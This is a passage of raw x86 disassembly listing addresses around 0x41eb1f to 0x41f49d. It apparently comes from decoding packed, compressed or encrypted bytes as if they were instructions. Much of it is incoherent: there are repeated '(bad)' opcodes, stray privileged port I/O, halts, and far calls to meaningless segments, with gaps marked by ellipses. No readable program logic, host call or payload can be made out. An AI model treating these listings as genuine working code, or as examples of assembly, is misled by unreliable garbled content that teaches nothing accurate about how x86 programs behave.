  41eb1f:	and    ebp,DWORD PTR [eax]
  41eb21:	fld    st(1)
  41eb23:	jl     0x41eb87
  41eb25:	(bad)  
  41eb26:	adc    al,BYTE PTR [ebp+0x1]
  41eb29:	add    BYTE PTR [edi],al
  41eb2b:	add    DWORD PTR [eax],eax
  41eb2d:	add    BYTE PTR [ecx+0x6ff45625],bh
  41eb33:	scas   al,BYTE PTR es:[edi]
  41eb34:	popf   
  41eb35:	(bad)  
  41eb36:	push   esp
  41eb37:	retf   
  41eb38:	std    
  41eb39:	loop   0x41eae5
  41eb3b:	push   0xbdd9b2f
  41eb40:	cmp    esp,eax
  41eb42:	jmp    0xfc29878f
  41eb47:	add    DWORD PTR [edi],edi
  41eb49:	sub    DWORD PTR ds:0x599d01b,edx
  41eb4f:	inc    ebx
  41eb50:	dec    ebp
  41eb51:	mov    bh,0xeb
  41eb53:	fistp  QWORD PTR [esi+esi*1]
  41eb56:	mov    ecx,0xf0092518
  41eb5b:	add    bh,al
  41eb5d:	add    bh,dl
  41eb5f:	ja     0x41eaec
  41eb61:	ret    
  41eb62:	mov    dh,0x6c
  41eb64:	in     al,dx
  41eb65:	and    DWORD PTR [eax+0x11],ebp
  41eb68:	xchg   DWORD PTR [ebx+ecx*8],edx
  41eb6b:	cld    
  41eb6c:	in     eax,0xd7
  41eb6e:	(bad)  
  41eb6f:	and    BYTE PTR [edi-0x5aebbbf1],ch
  41eb75:	mov    al,ds:0xa70b295
  41eb7a:	and    DWORD PTR [esp+ebp*4-0x5f],ebx
  41eb7e:	sbb    BYTE PTR [ebp-0x1c],dh
  41eb81:	std    
  41eb82:	push   esp
  41eb83:	mov    ebp,0x5534c263
  41eb88:	ss xchg ecx,eax
  41eb8a:	out    0x93,al
  41eb8c:	mov    ebx,esp
  41eb8e:	adc    eax,0xe3ed4653
  41eb93:	repnz lods eax,DWORD PTR ds:[esi]
  41eb95:	inc    esp
  41eb96:	sub    eax,0xe9e094dd
  41eb9b:	(bad)  
  41eb9c:	xor    eax,0x2fd4c806
  41eba1:	add    esi,DWORD PTR [ebx]
  41eba3:	dec    eax
  41eba4:	aaa    
  41eba5:	pop    esp
  41eba6:	xchg   ebx,eax
  41eba7:	jns    0x41ec04
  41eba9:	push   edi
  41ebaa:	add    eax,0x6bcde260
  41ebaf:	xor    al,0xf5
  41ebb1:	sbb    al,0x7b
  41ebb3:	data16 aaa 
  41ebb5:	dec    ebp
  41ebb6:	add    edx,DWORD PTR [ecx+0x58]
  41ebb9:	lods   eax,DWORD PTR ds:[esi]
  41ebba:	addr16 cwde 
  41ebbc:	jecxz  0x41ebb1
  41ebbe:	adc    bh,bh
  41ebc0:	mov    eax,DWORD PTR [edi+0x4417a1b2]
  41ebc6:	lods   eax,DWORD PTR ds:[esi]
  41ebc7:	jb     0x41ebfb
  41ebc9:	adc    DWORD PTR [esi-0x40],edi
  41ebcc:	js     0x41eb56
  41ebce:	pop    es
  41ebcf:	cmp    esi,edi
  41ebd1:	push   ebp
  41ebd2:	mov    ebp,0xf204047b
  41ebd7:	in     al,0x59
  41ebd9:	inc    eax
  41ebda:	sbb    eax,0x58c251eb
  41ebdf:	shl    BYTE PTR [ebx],cl
  41ebe1:	jp     0x41ec11
  41ebe3:	adc    esi,DWORD PTR [edi-0x5b]
  41ebe6:	(bad)  
  41ebe7:	js     0x41ec36
  41ebe9:	xlat   BYTE PTR ds:[ebx]
  41ebea:	jne    0x41ec0c
  41ebec:	pop    es
  41ebed:	out    0x3f,al
  41ebef:	or     DWORD PTR [ecx],edx
  41ebf1:	jmp    0x174:0x2c96667
  41ebf8:	ret    0x90fc
  41ebfb:	test   BYTE PTR [eax-0x74],al
  41ebfe:	sbb    al,BYTE PTR [ecx+0x54]
  41ec01:	into   
  41ec02:	jecxz  0x41ec7b
  41ec04:	bound  ebx,QWORD PTR [esi-0x18349aab]
  41ec0a:	hlt    
  41ec0b:	aad    0x46
  41ec0d:	adc    DWORD PTR [ecx-0x3],edx
  41ec10:	adc    al,0x4
  41ec12:	dec    edi
  41ec13:	adc    eax,0x69e5ea6c
  41ec18:	or     esi,ebp
  41ec1a:	in     eax,0xa1
  41ec1c:	daa    
  41ec1d:	rol    esi,0xd8
  41ec20:	add    eax,0xc0d9706
  41ec25:	xchg   ebx,eax
  41ec26:	push   ebp
  41ec27:	pop    edx
  41ec28:	pop    ebx
  41ec29:	pop    edi
  41ec2a:	test   BYTE PTR [edx-0x8caf727],bh
  41ec30:	push   ss
  41ec31:	push   0x3a
  41ec33:	xor    eax,0x26
	...
  41ec94:	add    BYTE PTR [eax],al
  41ec96:	inc    ecx
  41ec97:	icebp  
  41ec98:	(bad)
  41ec9b:	hlt    
  41ec9c:	gs icebp 
  41ec9e:	adc    ebx,edi
  41eca0:	ficom  WORD PTR [ecx]
  41eca2:	and    al,0x80
  41eca4:	outs   dx,DWORD PTR ds:[esi]
  41eca5:	xchg   BYTE PTR [ecx],bl
  41eca7:	inc    esi
  41eca8:	add    DWORD PTR [eax],eax
  41ecaa:	pop    es
  41ecab:	add    DWORD PTR [eax],eax
  41ecad:	add    BYTE PTR [ebp-0x71968ea3],bh
  41ecb3:	out    0x63,al
  41ecb5:	ficomp DWORD PTR [ebp+0x1a9da9ca]
  41ecbb:	cdq    
  41ecbc:	push   ds
  41ecbd:	ins    DWORD PTR es:[edi],dx
  41ecbe:	and    al,0xf
  41ecc0:	cmc    
  41ecc1:	xchg   esi,eax
  41ecc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ecc3:	xchg   edi,eax
  41ecc4:	mov    BYTE PTR [ecx-0x775744d],0x8f
  41eccb:	pop    esi
  41eccc:	fwait
  41eccd:	sbb    DWORD PTR [ecx+0x54],eax
  41ecd0:	call   0xc56f:0xd022b13d
  41ecd7:	(bad)  
  41ecd8:	mov    cl,0x1d
  41ecda:	ja     0x41ecbb
  41ecdc:	sbb    bh,BYTE PTR [ebp+0x69]
  41ecdf:	dec    esi
  41ece0:	(bad)  
  41ece1:	adc    ebx,DWORD PTR [ecx+ebx*4-0x61]
  41ece5:	iret   
  41ece6:	pop    ebp
  41ece7:	shl    DWORD PTR [esp+ecx*4],1
  41ecea:	ja     0x41ec89
  41ecec:	lods   eax,DWORD PTR ds:[esi]
  41eced:	enter  0xc512,0x1f
  41ecf1:	mov    al,0x5c
  41ecf3:	hlt    
  41ecf4:	mov    dh,0xff
  41ecf6:	mov    WORD PTR [eax+0x2ee21c89],gs
  41ecfc:	xchg   BYTE PTR [ecx-0x114481d7],dl
  41ed02:	jle    0x41ed59
  41ed04:	leave  
  41ed05:	idiv   BYTE PTR [eax-0x2b]
  41ed08:	jno    0x41ed37
  41ed0a:	mov    ebx,0x4b3f6cd6
  41ed0f:	retf   0x65af
  41ed12:	jg     0x41ec96
  41ed14:	jo     0x41ecf5
  41ed16:	das    
  41ed17:	test   BYTE PTR [ecx],0xc0
  41ed1a:	push   ss
  41ed1b:	jae    0x41ecf5
  41ed1d:	or     DWORD PTR [eax+eiz*4+0x46022ba0],ecx
  41ed24:	jle    0x41ed61
  41ed26:	aam    0x7b
  41ed28:	clc    
  41ed29:	jg     0x41ecbc
  41ed2b:	add    eax,0x642f22e4
  41ed30:	cmp    ebx,esi
  41ed32:	push   0xea8cc8e
  41ed37:	aas    
  41ed38:	call   0xf4e6:0x6903595a
  41ed3f:	ins    DWORD PTR es:[edi],dx
  41ed40:	xor    bl,BYTE PTR [ecx-0x3a]
  41ed43:	push   ebx
  41ed44:	xchg   esp,eax
  41ed45:	ret    
  41ed46:	stos   BYTE PTR es:[edi],al
  41ed47:	lea    eax,[esi+eiz*4+0xe]
  41ed4b:	fsubr  QWORD PTR [eax+0x53]
  41ed4e:	popf   
  41ed4f:	push   cs
  41ed50:	(bad)  
  41ed51:	and    ebp,DWORD PTR [edi]
  41ed53:	loop   0x41ed38
  41ed55:	inc    ebp
  41ed56:	dec    esp
  41ed57:	sbb    al,0xb5
  41ed59:	sti    
  41ed5a:	jb     0x41edb1
  41ed5c:	inc    esp
  41ed5d:	lds    ecx,FWORD PTR [ebx+0x9735756]
  41ed63:	inc    edx
  41ed64:	mov    ebx,0xc8a3e649
  41ed69:	mov    dl,0x7c
  41ed6b:	popf   
  41ed6c:	push   edi
  41ed6d:	inc    edi
  41ed6e:	or     dh,BYTE PTR [edx+ebx*1]
  41ed71:	add    ah,ch
  41ed73:	mov    bh,0x9
  41ed75:	and    DWORD PTR [edi+0x4e],eax
  41ed78:	add    ch,BYTE PTR [ecx]
  41ed7a:	adc    BYTE PTR [ecx+0x1b],dl
  41ed7d:	or     ch,bl
  41ed7f:	push   ds
  41ed80:	std    
  41ed81:	pusha  
  41ed82:	push   ebx
  41ed83:	stos   DWORD PTR es:[edi],eax
  41ed84:	call   esp
  41ed86:	mov    ch,BYTE PTR [ebp+0x7f374335]
  41ed8c:	pop    ecx
  41ed8d:	stos   DWORD PTR es:[edi],eax
  41ed8e:	or     edi,ebx
  41ed90:	push   ss
  41ed91:	mov    DWORD PTR [ebx-0x211750cf],eax
  41ed97:	push   ebp
  41ed98:	shl    BYTE PTR [eax-0x6f],cl
  41ed9b:	call   edi
  41ed9d:	outs   dx,BYTE PTR ds:[esi]
  41ed9e:	lea    esi,[edx+0x38]
  41eda1:	aas    
  41eda2:	out    0x9f,eax
  41eda4:	pop    edi
  41eda5:	cwde   
  41eda6:	std    
  41eda7:	sahf   
  41eda8:	jns    0x41ee17
  41edaa:	dec    ecx
  41edab:	mov    ecx,esi
  41edad:	mov    bl,0x54
  41edaf:	push   0x13bda3c1
  41edb4:	out    0x0,al
	...
  41ee16:	add    eax,0x7b197956
  41ee1b:	aas    
  41ee1c:	gs pop esi
  41ee1e:	mov    ds:0xb775b0a2,al
  41ee23:	push   ds
  41ee24:	lea    ebp,[ecx+0x14720]
  41ee2a:	pop    es
  41ee2b:	add    DWORD PTR [eax],eax
  41ee2d:	add    BYTE PTR [eax],ah
  41ee2f:	ror    BYTE PTR [ebx],1
  41ee31:	cmp    bl,dh
  41ee33:	outs   dx,BYTE PTR ds:[esi]
  41ee34:	clc    
  41ee35:	in     al,0x22
  41ee37:	pop    es
  41ee38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee39:	mov    ebx,0xb1522131
  41ee3e:	mov    eax,ds:0x96650e1e
  41ee43:	icebp  
  41ee44:	or     eax,0xec78f870
  41ee49:	fadd   DWORD PTR [edi+0x5b]
  41ee4c:	shr    DWORD PTR [ebx+esi*4+0x4f],0x8c
  41ee51:	fsub   st,st(4)
  41ee53:	mov    al,0x33
  41ee55:	jecxz  0x41ee8a
  41ee57:	push   cs
  41ee58:	loop   0x41ee96
  41ee5a:	dec    esi
  41ee5b:	repnz (bad)
  41ee5e:	pusha  
  41ee5f:	sub    BYTE PTR [ebx+0x69],cl
  41ee62:	mov    eax,eax
  41ee64:	cwde   
  41ee65:	int    0x98
  41ee67:	sbb    DWORD PTR [ebx+0x6d82adc9],ecx
  41ee6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee6e:	les    eax,FWORD PTR [edx+esi*8+0x6352cbae]
  41ee75:	sbb    BYTE PTR [eax],ch
  41ee77:	pop    ecx
  41ee78:	aas    
  41ee79:	sbb    ecx,esp
  41ee7b:	push   esp
  41ee7c:	loop   0x41ee41
  41ee7e:	imul   edx,ebx,0x30
  41ee81:	ins    DWORD PTR es:[edi],dx
  41ee82:	inc    edi
  41ee83:	je     0x41ee08
  41ee85:	cmc    
  41ee86:	add    BYTE PTR [edx+0x39997968],0x26
  41ee8d:	retf   
  41ee8e:	popf   
  41ee8f:	xchg   ebp,eax
  41ee90:	and    BYTE PTR [ebx+0x317208ae],dl
  41ee96:	xchg   ebp,eax
  41ee97:	das    
  41ee98:	sbb    ecx,ebp
  41ee9a:	cmc    
  41ee9b:	imul   ebx,ebp,0x75
  41ee9e:	push   es
  41ee9f:	fst    DWORD PTR [esp+esi*4+0x796f4aa8]
  41eea6:	cmp    DWORD PTR [edi+ecx*2],ecx
  41eea9:	js     0x41ef09
  41eeab:	or     BYTE PTR ds:0x8eebde4c,dl
  41eeb1:	inc    eax
  41eeb2:	test   cl,dh
  41eeb4:	(bad)  
  41eeb5:	pmaxub mm5,QWORD PTR [edx-0x39]
  41eeb9:	cmp    bl,BYTE PTR [eax+0x2d]
  41eebc:	jge    0x41ef05
  41eebe:	mov    ebx,0xc452f66d
  41eec3:	adc    BYTE PTR [esi],bh
  41eec5:	(bad)  
  41eec6:	in     eax,dx
  41eec7:	stos   BYTE PTR es:[edi],al
  41eec8:	sub    al,BYTE PTR [edi-0x899867]
  41eece:	popf   
  41eecf:	iret   
  41eed0:	inc    esp
  41eed1:	cs (bad) 
  41eed3:	adc    esp,ebp
  41eed5:	nop
  41eed6:	(bad)  
  41eed7:	fsub   DWORD PTR [edi+0x6e]
  41eeda:	or     dl,cl
  41eedc:	xchg   edx,eax
  41eedd:	call   FWORD PTR [esi-0x32]
  41eee0:	jge    0x41ef30
  41eee2:	jl     0x41ef53
  41eee4:	js     0x41eed9
  41eee6:	dec    esp
  41eee7:	test   eax,0x6e9f1838
  41eeec:	mov    ah,0xfc
  41eeee:	jle    0x41ef4b
  41eef0:	div    DWORD PTR [eax]
  41eef2:	mov    eax,ds:0x16740c9b
  41eef7:	gs stos DWORD PTR es:[edi],eax
  41eef9:	jo     0x41ef15
  41eefb:	fs push esi
  41eefd:	psadbw mm4,QWORD PTR [esi+0x610fe233]
  41ef04:	test   BYTE PTR [ebx],bh
  41ef06:	scas   al,BYTE PTR es:[edi]
  41ef07:	xor    DWORD PTR [esi+0x7a],ebp
  41ef0a:	fcom   DWORD PTR [edx-0x50d5f8bf]
  41ef10:	sub    BYTE PTR [ecx],dl
  41ef12:	xchg   edi,eax
  41ef13:	gs xchg ebp,eax
  41ef15:	enterw 0xbbc,0xbc
  41ef1a:	add    eax,0xfa9818ed
  41ef1f:	lea    eax,[edi-0x1d]
  41ef22:	aad    0x40
  41ef24:	add    BYTE PTR [ecx+0x2868a07a],dh
  41ef2a:	inc    edx
  41ef2b:	jl     0x41ef95
  41ef2d:	push   edx
  41ef2e:	mov    edi,0x23be7c3d
  41ef33:	into   
  41ef34:	aam    0x0
	...
  41ef96:	mov    ecx,0xff25bf5d
  41ef9b:	out    0xbb,eax
  41ef9d:	fnstsw WORD PTR [eax+0x5cfceb38]
  41efa3:	inc    edi
  41efa4:	xchg   ebp,eax
  41efa5:	sti    
  41efa6:	daa    
  41efa7:	dec    eax
  41efa8:	add    DWORD PTR [eax],eax
  41efaa:	pop    es
  41efab:	add    DWORD PTR [eax],eax
  41efad:	add    BYTE PTR [ecx+0x9],bh
  41efb0:	sub    eax,0xedb3c0df
  41efb5:	fst    DWORD PTR [ebp-0x64fc3fb6]
  41efbb:	push   0x1d
  41efbd:	test   BYTE PTR [edi],0x8c
  41efc0:	sbb    eax,0x3e4c5191
  41efc5:	and    BYTE PTR [ecx-0x5],dl
  41efc8:	inc    ebp
  41efc9:	test   BYTE PTR [edx+0x199cabae],bh
  41efcf:	jp     0x41ef96
  41efd1:	adc    bl,BYTE PTR [edi+0x5b0d3d0d]
  41efd7:	shr    DWORD PTR [edx+esi*8+0x2693037d],cl
  41efde:	shl    DWORD PTR [esi],cl
  41efe0:	push   0xffffff80
  41efe2:	pusha  
  41efe3:	jp     0x41ef8b
  41efe5:	adc    al,0x1b
  41efe7:	lock pop es
  41efe9:	sahf   
  41efea:	loopne 0x41efe5
  41efec:	in     eax,dx
  41efed:	xchg   edi,eax
  41efee:	iret   
  41efef:	dec    ebp
  41eff0:	inc    edx
  41eff1:	cs jg  0x41f02c
  41eff4:	adc    ah,ch
  41eff6:	pop    ecx
  41eff7:	dec    eax
  41eff8:	call   0x5799:0x28f60e30
  41efff:	cmp    esi,esp
  41f001:	add    eax,0xf55579e1
  41f006:	dec    ecx
  41f007:	lds    esi,FWORD PTR [ebx-0x3b]
  41f00a:	out    0xaa,al
  41f00c:	add    DWORD PTR [ebp-0x7124a382],esp
  41f012:	and    BYTE PTR [esp+ebp*2+0x26ae9a9f],0x15
  41f01a:	xor    BYTE PTR [ebx],cl
  41f01c:	inc    edi
  41f01d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f01e:	mov    ds:0x1ecba5c5,eax
  41f023:	cli    
  41f024:	scas   al,BYTE PTR es:[edi]
  41f025:	fwait
  41f026:	out    0x8e,eax
  41f028:	iret   
  41f029:	test   BYTE PTR [ebx+edi*1+0x1591c9e5],ch
  41f030:	sti    
  41f031:	mov    ds:0x8dd5364d,eax
  41f036:	cdq    
  41f037:	fdiv   st,st(4)
  41f039:	pop    ebx
  41f03a:	mov    BYTE PTR [eax+ebp*2],0x26
  41f03e:	sbb    eax,0x6ab98526
  41f043:	jns    0x41f05b
  41f045:	xor    bh,BYTE PTR [esi-0x6a2511b0]
  41f04b:	retf   0x5787
  41f04e:	imul   ebp,DWORD PTR [ecx+0x753344ba],0x1c
  41f055:	inc    esi
  41f056:	push   ecx
  41f057:	cmp    ecx,0x77
  41f05a:	push   cs
  41f05b:	push   0x68
  41f05d:	(bad)  
  41f05e:	call   0x5ccd9b
  41f063:	lock xor eax,0xd0bd34b9
  41f069:	inc    edx
  41f06a:	(bad)  
  41f06b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f06c:	dec    edi
  41f06d:	sub    edi,edi
  41f06f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f070:	or     DWORD PTR [eax-0x62],ecx
  41f073:	out    0xc0,eax
  41f075:	mov    esp,0xec17ead9
  41f07a:	jbe    0x41f06b
  41f07c:	xchg   esi,eax
  41f07d:	and    BYTE PTR [edi-0x39],bh
  41f080:	mov    gs,WORD PTR [edi+0x22]
  41f083:	dec    esi
  41f084:	xchg   BYTE PTR [ecx+0x79cb0a94],al
  41f08a:	inc    ebx
  41f08b:	cmp    al,0xf
  41f08d:	jge    0x41f0c0
  41f08f:	adc    BYTE PTR [eax+0x7de1eaa9],cl
  41f095:	mov    bh,0xb7
  41f097:	js     0x41f0b2
  41f099:	icebp  
  41f09a:	je     0x41f079
  41f09c:	or     eax,DWORD PTR [esi+0x30]
  41f09f:	inc    ebx
  41f0a0:	(bad)  
  41f0a1:	xor    DWORD PTR [edx-0x69],eax
  41f0a4:	cs xchg ecx,eax
  41f0a6:	mov    bh,0x20
  41f0a8:	sbb    BYTE PTR [ebx+0x52e4ccc],ah
  41f0ae:	test   bl,cl
  41f0b0:	or     DWORD PTR ds:0x7b36cf,ebx
	...
  41f116:	fild   QWORD PTR [edx+ebp*1+0x6c]
  41f11b:	mov    ebx,0x6df0ffdf
  41f120:	sub    dh,BYTE PTR [ecx+0x3068ef6]
  41f126:	cs dec ecx
  41f128:	add    DWORD PTR [eax],eax
  41f12a:	pop    es
  41f12b:	add    DWORD PTR [eax],eax
  41f12d:	add    BYTE PTR [ebx],ah
  41f12f:	mov    ebx,0x609a9dd
  41f134:	lods   al,BYTE PTR ds:[esi]
  41f135:	dec    esp
  41f136:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f137:	push   esp
  41f138:	(bad)  
  41f139:	aad    0x43
  41f13b:	xor    cl,BYTE PTR [eax]
  41f13d:	loope  0x41f154
  41f13f:	loop   0x41f182
  41f141:	pusha  
  41f142:	pop    esp
  41f143:	dec    esp
  41f144:	data16 int3 
  41f146:	ficomp WORD PTR ds:0xc4040ce9
  41f14c:	sub    DWORD PTR [edx+0x7b],0x312887ce
  41f153:	jo     0x41f163
  41f155:	mov    dh,0x5
  41f157:	out    dx,al
  41f158:	dec    edi
  41f159:	pop    esi
  41f15a:	dec    esp
  41f15b:	push   0xffffff9a
  41f15d:	sahf   
  41f15e:	fdiv   DWORD PTR [ebp+0x74a83775]
  41f164:	lock (bad) [ebx]
  41f167:	lock pop edi
  41f169:	cmp    al,bl
  41f16b:	prefetch BYTE PTR [ecx+0x29]
  41f16f:	lods   al,BYTE PTR ds:[esi]
  41f170:	fst    QWORD PTR [esi]
  41f172:	push   0x66
  41f174:	jp     0x41f141
  41f176:	addr16 pop edi
  41f178:	and    eax,0x47ab044e
  41f17d:	ins    DWORD PTR es:[edi],dx
  41f17e:	or     DWORD PTR [edx+0x54],esp
  41f181:	push   0xd8be2345
  41f186:	jecxz  0x41f108
  41f188:	or     ah,0xd2
  41f18b:	adc    ah,BYTE PTR [esp+edi*1+0x7c5b57c7]
  41f192:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f194:	cmp    bh,BYTE PTR [ebx]
  41f196:	fldcw  WORD PTR [edi-0x27339f51]
  41f19c:	je     0x41f168
  41f19e:	sar    esi,0xe0
  41f1a1:	jp     0x41f1a2
  41f1a3:	or     al,0x61
  41f1a5:	mov    dh,0xe
  41f1a7:	pop    ds
  41f1a8:	loope  0x41f212
  41f1aa:	add    BYTE PTR gs:[esi-0x1e],dh
  41f1ae:	shl    BYTE PTR [edx-0x6018595c],cl
  41f1b4:	jo     0x41f1e1
  41f1b6:	scas   eax,DWORD PTR es:[edi]
  41f1b7:	popa   
  41f1b8:	sahf   
  41f1b9:	fcomp  DWORD PTR [ecx+0x3d]
  41f1bc:	dec    edx
  41f1bd:	(bad)  
  41f1be:	clc    
  41f1bf:	cli    
  41f1c0:	and    DWORD PTR [eax+ecx*8-0x55],eax
  41f1c4:	pop    ebx
  41f1c5:	dec    edi
  41f1c6:	pop    edx
  41f1c7:	and    BYTE PTR [edi+0x9],bh
  41f1ca:	arpl   bx,sp
  41f1cc:	pop    edi
  41f1cd:	cmp    ebx,ecx
  41f1cf:	or     esp,ebp
  41f1d1:	mov    al,0x83
  41f1d3:	or     DWORD PTR fs:[ebp-0x34a5f260],ebx
  41f1da:	sub    cl,BYTE PTR [edi+0x7f]
  41f1dd:	mov    ch,0x23
  41f1df:	ret    
  41f1e0:	push   ss
  41f1e1:	push   es
  41f1e2:	les    esi,FWORD PTR [ebx+edi*8-0x6bbb1829]
  41f1e9:	test   al,0x1a
  41f1eb:	ss leave 
  41f1ed:	ja     0x41f237
  41f1ef:	std    
  41f1f0:	hlt    
  41f1f1:	mov    eax,ds:0x17e1ab57
  41f1f6:	mov    bh,0xc9
  41f1f8:	and    DWORD PTR [edx+esi*1-0x3b],ecx
  41f1fc:	(bad)  
  41f1fe:	push   ebx
  41f1ff:	test   eax,0x36e94fba
  41f204:	sub    DWORD PTR [edi+0x16],0xffffffc8
  41f208:	adc    ah,BYTE PTR [ebx-0x4a]
  41f20b:	mov    esp,DWORD PTR [eax-0x3089d09e]
  41f211:	mov    ds:0xb1165382,al
  41f216:	imul   eax,DWORD PTR [ebx-0x70],0x85fbefae
  41f21d:	(bad)  [ebx+0x3bdf695]
  41f223:	mov    eax,ds:0x8224978b
  41f228:	or     eax,0xbcd020b8
  41f22d:	(bad)  
  41f22e:	daa    
  41f22f:	adc    cl,al
  41f231:	push   esi
  41f232:	and    DWORD PTR [eax+0xc5],ecx
	...
  41f294:	add    BYTE PTR [eax],al
  41f296:	push   ecx
  41f297:	sbb    edi,edi
  41f299:	jmp    si
  41f29c:	fnstcw WORD PTR [edi]
  41f29e:	push   eax
  41f29f:	xor    DWORD PTR [edi-0x14],ebx
  41f2a2:	push   es
  41f2a3:	jb     0x41f24f
  41f2a5:	das    
  41f2a6:	xor    eax,0x700014a
  41f2ab:	add    DWORD PTR [eax],eax
  41f2ad:	add    BYTE PTR [ebx],dl
  41f2af:	mov    ds:0x1ee2ea0f,eax
  41f2b4:	adc    DWORD PTR [ebx+0x4df7b0c],ebx
  41f2ba:	sub    cl,BYTE PTR [ebx+eiz*4]
  41f2bd:	data16 es out dx,al
  41f2c0:	mov    ch,0x67
  41f2c2:	enter  0x140,0xda
  41f2c6:	fldcw  WORD PTR [ebx]
  41f2c8:	dec    DWORD PTR [edx-0x7bf285d6]
  41f2ce:	sbb    BYTE PTR [ebp+0x59],ah
  41f2d1:	retf   0x59e3
  41f2d4:	jbe    0x41f30a
  41f2d6:	aaa    
  41f2d7:	dec    esp
  41f2d8:	hlt    
  41f2d9:	nop
  41f2da:	sub    dh,dl
  41f2dc:	inc    ebx
  41f2dd:	cmp    DWORD PTR [ecx+0x54],esi
  41f2e0:	jl     0x41f284
  41f2e2:	ret    0x6a18
  41f2e5:	xchg   esi,ebp
  41f2e7:	outs   dx,DWORD PTR ds:[esi]
  41f2e8:	shl    BYTE PTR [esi],0x67
  41f2eb:	cmp    eax,0xcab7fa39
  41f2f0:	sbb    DWORD PTR [edx-0x3d],ecx
  41f2f3:	jl     0x41f2cb
  41f2f5:	xor    dl,BYTE PTR [ebp-0x4867dc0e]
  41f2fb:	cmp    ebx,DWORD PTR [edx+ecx*2+0x37cbd40a]
  41f302:	loopne 0x41f2ec
  41f304:	mov    ecx,0xa50433d3
  41f309:	dec    esp
  41f30a:	jnp    0x41f381
  41f30c:	mov    ecx,0xb0e60de3
  41f312:	call   0x78b8:0xc48d004
  41f319:	faddp  st(1),st
  41f31b:	dec    ecx
  41f31c:	pushf  
  41f31d:	and    DWORD PTR [ecx+0x21],ebp
  41f320:	or     eax,0x2d21a32f
  41f325:	fcmovbe st,st(4)
  41f327:	mov    BYTE PTR [edi-0x2039f265],al
  41f32d:	push   ebp
  41f32e:	pop    es
  41f32f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f330:	(bad)  
  41f331:	loopne 0x41f3a4
  41f333:	push   esi
  41f334:	cs pusha 
  41f336:	adc    cl,BYTE PTR [esi]
  41f338:	shl    DWORD PTR [edx-0x37838988],cl
  41f33e:	or     al,0x23
  41f340:	ins    DWORD PTR es:[edi],dx
  41f341:	pop    eax
  41f342:	popf   
  41f343:	loope  0x41f2f3
  41f345:	vxorps ymm2,ymm5,YMMWORD PTR [ebp-0x6f95c9f8]
  41f34d:	shl    BYTE PTR [edi],cl
  41f34f:	adc    ecx,ebp
  41f351:	xchg   eax,esi
  41f353:	push   eax
  41f354:	je     0x41f321
  41f356:	push   gs
  41f358:	fcom   QWORD PTR [edi]
  41f35a:	push   es
  41f35b:	push   esp
  41f35c:	inc    ecx
  41f35d:	imul   edi,DWORD PTR [edi+ebp*8-0x6b8f9831],0xffffffc1
  41f365:	inc    esp
  41f367:	push   0xffffffc6
  41f369:	inc    eax
  41f36a:	xchg   edi,eax
  41f36b:	gs push ds
  41f36d:	push   ss
  41f36e:	adc    al,0x8f
  41f370:	jp     0x41f37c
  41f372:	ss xchg esp,eax
  41f374:	shl    edi,1
  41f376:	imul   edi,DWORD PTR [edi+0x79],0xffffffc7
  41f37a:	mov    ebp,DWORD PTR [esi-0x1e]
  41f37d:	inc    edx
  41f37e:	addr16 and al,0x89
  41f381:	fadd   st,st(6)
  41f383:	sub    edx,ebx
  41f385:	and    BYTE PTR [ebx-0x30],ah
  41f388:	rcl    BYTE PTR [esi-0x5bbaace8],0xb5
  41f38f:	mov    BYTE PTR [edx+0x2d139a03],bh
  41f395:	push   edx
  41f396:	rcl    cl,0x38
  41f399:	(bad)  
  41f39a:	imul   edi,eax,0xbf4c2568
  41f3a0:	js     0x41f392
  41f3a2:	xor    BYTE PTR [edx+0x3745012c],al
  41f3a8:	xchg   ebx,eax
  41f3a9:	mov    dh,BYTE PTR [esi]
  41f3ab:	cmc    
  41f3ac:	dec    ebp
  41f3ad:	leave  
  41f3ae:	bound  esi,QWORD PTR [ebx+eiz*2]
  41f3b1:	and    ebx,DWORD PTR [eax+eiz*1+0x2]
	...
  41f415:	add    BYTE PTR [edi+eiz*8],bh
  41f418:	imul   ebp,edi,0xfffffffb
  41f41b:	out    dx,eax
  41f41c:	mov    esp,0xc961c5f7
  41f421:	xchg   edx,eax
  41f422:	in     eax,0xa0
  41f424:	loopne 0x41f460
  41f426:	cmp    al,0x4b
  41f428:	add    DWORD PTR [eax],eax
  41f42a:	pop    es
  41f42b:	add    DWORD PTR [eax],eax
  41f42d:	add    bl,bl
  41f42f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f430:	repnz mov BYTE PTR [eax],dl
  41f433:	(bad)  [ebx-0x13]
  41f436:	mov    eax,0xb87b3a03
  41f43b:	(bad)  
  41f43c:	fadd   st,st(2)
  41f43e:	inc    esi
  41f43f:	xchg   esi,eax
  41f440:	adc    cl,BYTE PTR [ebp-0x7e]
  41f443:	fmulp  st(4),st
  41f445:	xchg   DWORD PTR [ecx+0x54c85c5d],eax
  41f44b:	clc    
  41f44c:	cwde   
  41f44d:	xchg   BYTE PTR [ecx],dh
  41f44f:	lahf   
  41f450:	stos   DWORD PTR es:[edi],eax
  41f451:	mov    ebx,0x744478c5
  41f456:	stc    
  41f457:	add    esp,edx
  41f459:	in     al,dx
  41f45a:	sub    edi,DWORD PTR [edx-0x54a2eda0]
  41f460:	inc    eax
  41f461:	lds    esi,FWORD PTR [eax-0x7d]
  41f464:	pop    es
  41f465:	test   eax,0xe53a9402
  41f46a:	or     cl,BYTE PTR [ecx+0x73f07170]
  41f470:	int    0x5d
  41f472:	sub    esi,DWORD PTR [esi-0x2f]
  41f475:	mov    BYTE PTR [edx-0xbaca111],ah
  41f47b:	es std 
  41f47d:	mov    BYTE PTR [ebx],dl
  41f47f:	out    0xc8,al
  41f481:	xlat   BYTE PTR ds:[ebx]
  41f482:	dec    ecx
  41f483:	cmp    BYTE PTR [edx],cl
  41f485:	inc    esi
  41f486:	mov    al,ds:0xa81a2f61
  41f48b:	push   ebp
  41f48c:	cld    
  41f48d:	mov    cl,dh
  41f48f:	aas    
  41f490:	adc    BYTE PTR ds:0x1ed38dc4,bh
  41f496:	mov    DWORD PTR [esp+edx*4-0x2f37b60d],ebp
  41f49d:	mov    ss,WORD PTR [edi]
